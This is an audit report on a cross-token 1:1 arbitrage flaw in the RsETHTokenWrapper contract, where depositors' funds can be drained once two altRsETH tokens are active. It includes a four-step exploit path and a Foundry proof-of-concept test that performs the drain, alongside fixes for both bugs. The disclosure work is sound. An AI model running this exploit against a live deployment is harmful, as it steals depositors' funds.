Audit Report

## Title
Cross-token 1:1 arbitrage drains depositor funds when multiple altRsETH tokens are active - (File: contracts/L2/RsETHTokenWrapper.sol)

## Summary
`RsETHTokenWrapper` allows multiple altRsETH tokens to be registered via `reinitialize` and `addAllowedToken`, but `_deposit` and `_withdraw` enforce a strict 1:1 ratio with no exchange-rate check and no restriction on which allowed token a caller may withdraw. Once two tokens are active and trade at any price differential, any unprivileged user can deposit the cheaper token, receive wrsETH 1:1, and immediately withdraw the more expensive token 1:1, extracting the price difference from other depositors. The secondary `maxAmountToDepositBridgerAsset` bug inflates the per-token deposit ceiling by counting wrsETH minted against all other tokens, breaking the per-token collateralisation invariant.

## Finding Description
**Multi-token registration path (confirmed in code):**

`reinitialize` at L47–49 is the documented upgrade path for adding a second altRsETH token alongside the one registered in `initialize`. `addAllowedToken` at L174–176 allows a timelock to add further tokens. Both call `_addAllowedToken`, which sets `allowedTokens[_asset] = true` with no upper bound on the number of active tokens.

**Unconditional 1:1 mint (`_deposit`, L134–141):**
```solidity
ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
_mint(_to, _amount);
```
Any allowed token is accepted and exactly `_amount` wrsETH is minted — no oracle, no rate, no per-token accounting.

**Unconditional 1:1 burn with free token selection (`_withdraw`, L120–128):**
```solidity
_burn(msg.sender, _amount);
ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
```
The caller freely chooses `_asset`. There is no check that the wrsETH being burned was originally minted against that specific token.

**Exploit path (no privilege required after second token is added):**
1. Admin calls `reinitialize(altRsETH_B)` — a routine, intended governance action.
2. Attacker calls `deposit(altRsETH_A, N)` — receives N wrsETH.
3. Attacker calls `withdraw(altRsETH_B, N)` — burns N wrsETH, receives N altRsETH_B.
4. If altRsETH_B > altRsETH_A in market value, attacker profits; the victim who deposited altRsETH_B can no longer redeem at fair value.

**`maxAmountToDepositBridgerAsset` accounting error (L99–110):**
```solidity
uint256 wrsETHSupply = totalSupply();          // ALL wrsETH, from ALL tokens
uint256 balanceOfAssetInWrapper = ERC20Upgradeable(_asset).balanceOf(address(this));
return wrsETHSupply - balanceOfAssetInWrapper;
```
With 100 wrsETH minted for token A and 50 for token B, querying token A returns `150 − 100 = 50`, implying 50 more token A can be bridged in — but those 50 wrsETH are already backed by token B. The ceiling is inflated by every other token's contribution to total supply.

**Note on `AGETHTokenWrapper`:** The claim that `AGETHTokenWrapper` has the "identical" vulnerability is incorrect. That contract contains an explicit comment at L153 ("Don't allow to add other tokens at the moment") and has no `addAllowedToken` or multi-token `reinitialize` function. Only one token can ever be active, so the cross-token arbitrage path does not exist there. The `maxAmountToDepositBridgerAsset` calculation pattern is the same code shape, but is not exploitable with a single token.

## Impact Explanation
**Critical — direct theft of user funds.** Any user holding wrsETH (or able to acquire any allowed altRsETH) can extract the price spread between two allowed tokens from other depositors. The attack is atomic, requires no flash loan, no special role, and is repeatable until the cheaper token's balance in the wrapper is exhausted or the price differential closes.

## Likelihood Explanation
**Medium.** The precondition is that two allowed tokens are simultaneously active. `reinitialize` is present in the deployed contract and is the explicitly documented upgrade path for adding a second altRsETH (e.g., a LayerZero OFT alongside a native bridge token). This is a routine governance action, not an attack. Different bridge representations of the same underlying asset routinely trade at small but non-zero discounts on secondary markets, providing the price differential needed to profit. Once the second token is added, the exploit is immediately available to any address.

## Recommendation
1. **Per-token accounting**: add `mapping(address => uint256) public wrsETHMintedFor` incremented in `_deposit` and decremented in `_withdraw`. Use `wrsETHMintedFor[_asset]` instead of `totalSupply()` in `maxAmountToDepositBridgerAsset`.
2. **Enforce same-token redemption**: either (a) record which token each wrsETH unit was minted against and require withdrawal of the same token, or (b) introduce an on-chain oracle exchange rate between allowed tokens before permitting cross-token redemption.
3. If cross-token swaps are intentional, document the invariant explicitly and ensure all allowed tokens are guaranteed to be at parity (e.g., all are canonical bridge representations redeemable 1:1 on L1) before a second token is activated.

## Proof of Concept
**Foundry fork/unit test outline:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/L2/RsETHTokenWrapper.sol";
import "contracts/mocks/MockERC20.sol"; // or any ERC20 mock

contract CrossTokenArbitrageTest is Test {
    RsETHTokenWrapper wrapper;
    MockERC20 tokenA; // cheaper token, 1.00 USD equivalent
    MockERC20 tokenB; // premium token, 1.05 USD equivalent

    address admin = address(0xA);
    address alice = address(0xB); // victim
    address bob   = address(0xC); // attacker

    function setUp() public {
        tokenA = new MockERC20("altRsETH_A", "aA");
        tokenB = new MockERC20("altRsETH_B", "aB");

        wrapper = new RsETHTokenWrapper();
        wrapper.initialize(admin, address(0), address(tokenA));

        // Admin adds second token — routine governance action
        vm.prank(admin);
        wrapper.reinitialize(address(tokenB));

        // Fund participants
        tokenB.mint(alice, 100e18);
        tokenA.mint(bob,   100e18);
    }

    function testCrossTokenArbitrage() public {
        // Alice deposits the premium token
        vm.startPrank(alice);
        tokenB.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenB), 100e18);
        vm.stopPrank();

        // Bob deposits the cheap token
        vm.startPrank(bob);
        tokenA.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenA), 100e18);

        // Bob withdraws the premium token — free cross-token swap
        wrapper.withdraw(address(tokenB), 100e18);
        vm.stopPrank();

        // Bob now holds 100e18 tokenB (worth 105 USD) having spent 100e18 tokenA (worth 100 USD)
        assertEq(tokenB.balanceOf(bob), 100e18);
        // Wrapper holds only tokenA; Alice's wrsETH is backed by the cheaper token
        assertEq(tokenB.balanceOf(address(wrapper)), 0);
        assertEq(tokenA.balanceOf(address(wrapper)), 100e18);
        // Alice still holds 100e18 wrsETH but can only redeem tokenA at a loss
        assertEq(wrapper.balanceOf(alice), 100e18);
    }
}
```

The test demonstrates that Bob spends `tokenA` and receives `tokenB` with zero cost beyond the gas fee, extracting value directly from Alice's deposit.